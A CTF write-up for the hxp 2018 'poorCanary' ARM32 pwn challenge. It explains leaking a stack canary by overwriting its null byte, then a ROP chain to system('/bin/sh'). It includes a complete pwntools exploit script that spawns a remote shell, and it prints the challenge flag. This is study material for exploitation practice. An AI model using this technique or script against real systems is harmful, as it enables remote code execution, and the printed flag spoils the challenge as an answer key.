---
layout: post
title: Hxp 2018 poorCanary
date: 2025-07-05 18:32:03 +0300
categories: Nightmare-series ret2system
tags: nightmare buffer-overflow arm32 leak-canary ROP stack-canary ret2win qemu-arm arm 
---

## Information 
- Category: Pwn
- Points: 

## Description
> None

## Write-up
To run the program, we need ```qemu-arm```:
```bash
qemu-arm canary
Welcome to hxp's Echo Service!
> 21321312
21321312
> AAAAAAAAAAAAa
AAAAAAAAAAAAa
>
```


> To install it on **Arch Linux** ```sudo pacman -S qemu-user``` and ```yay -S arm-none-eabi-binutils arm-none-eabi-gdb``` 
{: .prompt-tip}


In the ```main``` function, we can see that it uses ```read()``` to get input from the user into the variable ```input + 1```, and then uses ```puts()``` to print it:
<img src="/images/poorcanary/main.png" style="border-radius: 14px;">

To bypass the canary, we need to know how far it is from our input.
The input buffer is 41 bytes, but the program writes to ```input + 1```, so we control only **40 bytes** of it.

The canary comes right after the buffer. If we send **40 bytes**, then send **1 extra byte**, we can overwrite the **first byte** of the canary — which is normally ```0x00```.

This small overwrite lets ```puts()``` print the rest of the canary.
As a result, we can leak **3 bytes** of the canary, and later use them to rebuild the full canary (by adding ```0x00``` as the last byte).



In Ghidra, we can find the ```system``` function and also the string ```"/bin/sh"``` in memory.
So we can call ```system("/bin/sh")``` to get a shell.

Now we just need a gadget to set ```r0``` (the first argument in ARM) to point to "/bin/sh".
For example, a gadget like ```pop {r0, pc}``` would work.

Finally, we calculate the offset from the buffer to the **return address**, so we can:
- Fill the buffer
- Add the canary
- Add padding 
- Overwrite the return address 


<img src="/images/poorcanary/payload.png" style="border-radius: 14px;">

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./canary")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 4422)

    return r

def leakCanary(r):

    offset = 37
    byteOW = b"Here"

    payload = b"A"*offset
    payload+= byteOW

    r.send(payload)
    r.recvuntil(b"Here")
 
    leak = r.recv(0x3)
    canary = b"\x00" + leak

    log.success(f"Canary = {canary}")

    return canary

def main():
    r = conn()

    pop_r0 = 0x00026b7c 
    system = 0x00016d90
    binsh = 0x71eb0

    canary = leakCanary(r)

    payload = b"A"*40 + canary
    payload+= b"B"*12
    payload+= p32(pop_r0) + p32(binsh)
    payload+= b"C"*4
    payload+= p32(system)

    r.send(payload)
    r.send("\n")

    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag
Flag: ```hxp{w3lc0m3_70_7h3_31337_club_k1dd0}```

 
